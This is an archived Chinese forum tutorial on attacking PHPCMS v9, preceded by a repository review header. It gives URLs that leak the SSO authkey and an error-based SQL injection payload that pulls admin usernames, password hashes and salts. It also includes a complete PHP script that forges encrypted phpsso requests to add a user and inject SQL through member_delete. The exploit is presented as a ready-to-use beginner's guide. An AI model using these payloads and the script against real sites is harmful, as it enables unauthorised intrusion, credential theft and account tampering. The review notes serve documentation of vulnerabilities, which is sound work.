---
source: "MrWQ/vulnerability-paper"
product: "PHPCMSv9 unspecified build"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "phpcms v9  authkey 注入 白帽子技术 - 思路 i 春秋社区 - 分享你的技术，为安全加点温度-"
prerequisites: "来源所述条件，未列明部分仍待核：SSO authkey可泄露，目标使用对应三种sys_auth格式，PHP允许远程file_get_contents"
side_effects: "未执行；本文需注意的操作影响：精确版本缺；和315同密钥泄漏端点但本篇补SSO member_delete SQLi，不应等同962会员cookie SQLi；脚本每种算法先添加uid88888用户再member_delete，具有账户写删副作用未在摘要说明；sys_auth2无key时引用$this不在对象"
source_status: "recorded"
source_url: "https://bbs.ichunqiu.com/thread-19033-1-1.html"
id: "vw-c7843d75e84971485c4b0633"
entity_id: "ve-c7843d75e84971485c4b0633"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：SSO authkey可泄露，目标使用对应三种sys_auth格式，PHP允许远程file_get_contents

- **凭据与会话边界（1）**：精确版本缺；和315同密钥泄漏端点但本篇补SSO member_delete SQLi，不应等同962会员cookie SQLi。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：$strings里&amp;regip变®ip编码污染；第二泄漏exp的固定加密data站点依赖未解释。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：脚本每种算法先添加uid88888用户再member_delete，具有账户写删副作用未在摘要说明；sys_auth2无key时引用$this不在对象。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **证据待核（4）**：论坛下载附件链接是相对forum.php及临时token，评论/下载计数/QQ群邀约混入正文应移除。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# phpcms v9  authkey 注入 白帽子技术 - 思路 i 春秋社区 - 分享你的技术，为安全加点温度-

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.ichunqiu.com](https://bbs.ichunqiu.com/thread-19033-1-1.html) ![](https://bbs.ichunqiu.com/template/win8mi_15th_design/src/noLogin.jpg)icq27160d12  我是小白，这是我写的第一篇文章，希望各位大牛多多指点。  
之前遇到一个 php 站，翻看一遍没什么可用的，就尝试下 robots.txt。 

**1.png** _(76.34 KB, 下载次数: 46)_


> 原网页控件或署名（归档文字，不属于示例代码）：`[下载附件](forum.php?mod=attachment&aid=Mzg1OTZ8ZjRiYzcxMjR8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)`


2017-2-14 20:56 上传

  
phpcms  v9 的，然后百度。找到爆 authkey 注入的。按照网上的步骤自己弄，不行。然后找到一个大牛的视频，一下就搞定了。鉴于网上的 phpcms authkey 注入文章太过深奥，对于像我这样的新手搞不来，所以自己写一篇。  
爆 authkey exp:  
1、api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin  
2、/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ  
第一个 exp：  


**2.png** _(86.24 KB, 下载次数: 45)_


> 原网页控件或署名（归档文字，不属于示例代码）：`[下载附件](forum.php?mod=attachment&aid=Mzg1OTd8MWVhZjhkMTV8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)`


2017-2-14 21:08 上传

  
第二个 exp:  


**8.png** _(103.68 KB, 下载次数: 35)_


> 原网页控件或署名（归档文字，不属于示例代码）：`[下载附件](forum.php?mod=attachment&aid=Mzg2MDB8OTEyNjE0NzR8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)`


2017-2-14 21:45 上传

  
爆出 authkey 后就是利用了。首先要搭建 php 环境，搭环境网上有很多教程，这里就不赘述了。  
首先给出 exp：  
php?url=url&key=key&id=userid=1%20and%20(SELECT%201%20FROM(SELECT%20count(*),concat((SELECT(SELECT%20concat(0x7e,0x27,cast((substring((select+concat(0x7e,0x27,username,0x3a,+password,+0x3a,+encrypt,0x27,0x40,0x7e)+FROM+`v9_admin`+WHERE+1+limit+0,1),1,62))%20as%20char),0x27,0x7e))%20FROM%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20FROM%20information_schema.columns%20group%20by%20x)a)  
注入脚本：  
[PHP] _纯文本查看_ _复制代码_

```
<?php
#error_reporting(0);
 
$url = $_GET['url'];
$key = $_GET['key'];
//$host = 'http://网站/';
//$auth_key = '爆的key';
//$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
 
$host = "http://$url/";
$auth_key = "$key";
$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
$strings = "action=member_add&uid=88888&random=333333&username=test123456&password=e445061346e44cc38d9f985836b9eac6&email=ffff@qq.com®ip=8.8.8.8";
 
$ecode = sys_auth($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
#echo $url;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth2($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth2($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth3($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth3($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
        $key_length = 4;
        $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
        $fixedkey = md5($key);
        $egiskeys = md5(substr($fixedkey, 16, 16));
        $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
        $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
        $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(strtr(substr($string, $key_length), '-_', '+/'));
 
        if($operation=='ENCODE'){
                $string .= substr(md5(microtime(true)), -4);
        }
        if(function_exists('mcrypt_encrypt')==true){
                $result=sys_auth_ex($string, $operation, $fixedkey);
        }else{
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
        }
        if($operation=='DECODE'){
                $result = substr($result, 0,-4);
        }
         
        if($operation == 'ENCODE') {
                return $runtokey . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        } else {
                if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                        return substr($result, 26);
                } else {
                        return '';
                }
        }
}
 
function sys_auth_ex($string,$operation = 'ENCODE',$key) 
{ 
    $encrypted_data="";
    $td = mcrypt_module_open('rijndael-256', '', 'ecb', '');
 
    $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
    $key = substr($key, 0, mcrypt_enc_get_key_size($td));
    mcrypt_generic_init($td, $key, $iv);
 
    if($operation=='ENCODE'){
        $encrypted_data = mcrypt_generic($td, $string);
    }else{
        $encrypted_data = rtrim(mdecrypt_generic($td, $string));
    }
    mcrypt_generic_deinit($td);
    mcrypt_module_close($td);
    return $encrypted_data;
}
 
function  sys_auth2($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $ckey_length = 4;
                $key = md5($key != '' ? $key : $this->ps_auth_key);
                $keya = md5(substr($key, 0, 16));
                $keyb = md5(substr($key, 16, 16));
                $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
                $cryptkey = $keya.md5($keya.$keyc);
                $key_length = strlen($cryptkey);
 
                $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + 
 
time() : 0).substr(md5($string.$keyb), 0, 16).$string;
                $string_length = strlen($string);
 
                $result = '';
                $box = range(0, 255);
 
                $rndkey = array();
                for($i = 0; $i <= 255; $i++) {
                        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
                }
 
                for($j = $i = 0; $i < 256; $i++) {
                        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
                        $tmp = $box[$i];
                        $box[$i] = $box[$j];
                        $box[$j] = $tmp;
                }
 
                for($a = $j = $i = 0; $i < $string_length; $i++) {
                        $a = ($a + 1) % 256;
                        $j = ($j + $box[$a]) % 256;
                        $tmp = $box[$a];
                        $box[$a] = $box[$j];
                        $box[$j] = $tmp;
                        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
                }
 
                if($operation == 'DECODE') {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$keyb), 0, 16)) {
                                return substr($result, 26);
                        } else {
                                return '';
                        }
                } else {
                        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
                }
        }
 
function sys_auth3($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $key_length = 4;
                $key = md5($key);
                $fixedkey = md5($key);
                $egiskeys = md5(substr($fixedkey, 16, 16));
                $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
                $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
                  
                $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(substr($string, $key_length));
                //10位密文过期信息+16位明文和密钥生成的密文验证信息+明文
                  
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                  $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
                  
                if($operation == 'ENCODE') {
                    return $runtokey . str_replace('=', '', base64_encode($result));
                } else {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                          return substr($result, 26);
                        } else {
                          return '';
                        }
                }
    }
 
 
?>
```

在 6,7 行填写上相应的网站域名和 authkey，丢到根目录下运行。后面加上 exp 就可以了（exp 中也要填写相应的网站域名和 authkey），像这样：  


**4.png** _(130.19 KB, 下载次数: 49)_


> 原网页控件或署名（归档文字，不属于示例代码）：`[下载附件](forum.php?mod=attachment&aid=Mzg1OTl8NTUwMDU5YjF8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)`


2017-2-14 21:27 上传

  
后面附上大牛视频：[http://bbs.ichunqiu.com/forum.ph ... mp;highlight=phpcms](http://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=11898&highlight=phpcms)  
  
  
 ![](https://bbs.ichunqiu.com/uc_server/avatar.php?uid=50014&size=middle) 小伙子有潜力哦，可以考虑加入作家团，不过这篇文章水准还不够，可以继续加油写一篇更好的，先加我 QQ：286894635，我们聊聊吧  厉害厉害 收下了  厉害了，膜拜！  为毛我 183 行提示错误

> [Orvilla 发表于 2017-5-9 15:21](https://bbs.ichunqiu.com/forum.php?mod=redirect&goto=findpost&pid=320026&ptid=19033)  
> 为毛我 183 行提示错误

哪里来的 183 行  有自动化注入脚本没

> [adshy 发表于 2017-9-19 02:59](https://bbs.ichunqiu.com/forum.php?mod=redirect&goto=findpost&pid=367645&ptid=19033)  
> 有自动化注入脚本没

要自己写  支持一下~

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
